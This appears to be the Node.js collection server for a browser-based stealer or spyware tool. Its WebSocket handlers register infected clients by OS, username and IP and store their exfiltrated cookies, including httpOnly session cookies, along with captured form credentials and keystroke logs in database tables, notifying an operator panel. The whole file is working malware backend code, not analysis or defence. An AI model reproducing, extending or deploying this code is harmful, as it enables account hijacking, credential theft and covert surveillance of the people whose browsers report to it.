const express = require("express");
const WebSocket = require("ws");
const db = require("./db"); // Adjust the path as necessary
const { socketMaps, sendEvent } = require("./sharedData");

module.exports = function initializeClientApi(appClients, server) {
  appClients.use(express.json());
  appClients.use(express.urlencoded({ extended: true }));

  const wss = new WebSocket.Server({ server });
  wss.on("connection", (ws) => {
    console.log("Client connected");
    ws.on("message", (message) => {
      try {
        const data = JSON.parse(message);
        if (data[0] == "alive") {
          handleAlive(ws, data[1]);
          return;
        }
        const client_id = getClientId(ws);
        switch (data[0]) {
          case "setcookies":
            handleSetCookies(client_id, data[1]);
            sendEvent("cookies", client_id);
            break;
          case "updatecookie":
            handeUpdateCookie(client_id, data[1]);
            sendEvent("cookies", client_id);
            break;
          case "addsubmittedcredentials":
            handleAddSubmittedCredentials(client_id, data[1]);
            sendEvent("credentials", client_id);
            break;
          case "activitylog":
            handleActivityLog(client_id, data[1]);
            sendEvent("keylogs", client_id);
            break;
        }
      } catch (err) {
        console.error(err);
      }
    });
    ws.on("close", (message) => {
      console.log("Client disconnected");
      const client_id = getClientId(ws);
      delete socketMaps[client_id];
      sendEvent("clientDisconnected", client_id);
    });
  });
};
function handleSetCookies(client_id, cookies) {
  db.transaction(() => {
    const stmt = db.prepare(
      `
      DELETE FROM cookies WHERE client_id = ?
    `
    );
    stmt.run(client_id);
    const stmtInsert = db.prepare(
      `
      INSERT INTO cookies (client_id, domain, name, value, expiration, secure, session, host_only, http_only, path)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `
    );
    cookies.forEach((cookie) => {
      stmtInsert.run(
        client_id,
        cookie.domain,
        cookie.name,
        cookie.value,
        cookie.expirationDate,
        cookie.secure ? 1 : 0,
        cookie.session ? 1 : 0,
        cookie.hostOnly ? 1 : 0,
        cookie.httpOnly ? 1 : 0,
        cookie.path
      );
    });
  })();
}
function handeUpdateCookie(client_id, cookie) {
  // check if cookie already exists
  const existingCookie = db
    .prepare(
      "SELECT name FROM cookies WHERE client_id = ? AND name = ? AND path = ? AND domain = ?"
    )
    .get(client_id, cookie.name, cookie.path, cookie.domain);
  if (!existingCookie) {
    //insert new cookie
    const stmtInsert = db.prepare(
      `
        INSERT INTO cookies (client_id, domain, name, value, expiration, secure, session, host_only, http_only, path)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      `
    );
    stmtInsert.run(
      client_id,
      cookie.domain,
      cookie.name,
      cookie.value,
      cookie.expirationDate,
      cookie.secure ? 1 : 0,
      cookie.session ? 1 : 0,
      cookie.hostOnly ? 1 : 0,
      cookie.httpOnly ? 1 : 0,
      cookie.path
    );
    return;
  }
  const stmt = db.prepare(
    `
      UPDATE cookies
      SET domain = ?, name = ?, value = ?, expiration = ?, secure = ?, session = ?, host_only = ?, http_only = ?, path = ?
      WHERE client_id = ? AND name = ?
    `
  );
  stmt.run(
    cookie.domain,
    cookie.name,
    cookie.value,
    cookie.expirationDate,
    cookie.secure ? 1 : 0,
    cookie.session ? 1 : 0,
    cookie.hostOnly ? 1 : 0,
    cookie.httpOnly ? 1 : 0,
    cookie.path,
    client_id,
    cookie.name
  );
}
function handleAddSubmittedCredentials(client_id, credentials) {
  const stmt = db.prepare(
    `
      INSERT INTO credentials (client_id, url, timestamp, data)
      VALUES (?, ?, ?, ?)
    `
  );
  stmt.run(
    client_id,
    credentials.metadata.url,
    credentials.metadata.timestamp,
    JSON.stringify(credentials.formData)
  );
}
function handleActivityLog(client_id, log) {
  const stmt = db.prepare(
    `
      INSERT INTO keylogs (client_id, timestamp, keystrokes, url)
      VALUES (?, ?, ?, ?)
    `
  );
  stmt.run(client_id, log.timestamp, log.keys, log.url);
}
function handleAlive(ws, data) {
  const { client_id, os, username } = data;
  if (!client_id || !os || !username) {
    return;
  }
  const existingClient = db
    .prepare("SELECT client_id FROM clients WHERE client_id = ?")
    .get(client_id);
  if (existingClient) {
    const stmt = db.prepare(
      `
          UPDATE clients
          SET os = ?, username = ?, ip_address = ?, last_seen = datetime('now')
          WHERE client_id = ?
        `
    );
    stmt.run(os, username, ws._socket.remoteAddress, existingClient.client_id);
  } else {
    const stmt = db.prepare(
      `
          INSERT INTO clients (client_id, os, username, ip_address, last_seen)
          VALUES (?, ?, ?, ?, datetime('now'))
        `
    );
    stmt.run(client_id, os, username, ws._socket.remoteAddress);
  }
  if (!socketMaps[client_id]) {
    socketMaps[client_id] = ws;
    sendEvent("clientConnected", client_id);
  }
}
function getClientId(socket) {
  return Object.keys(socketMaps).find((key) => socketMaps[key] === socket);
}
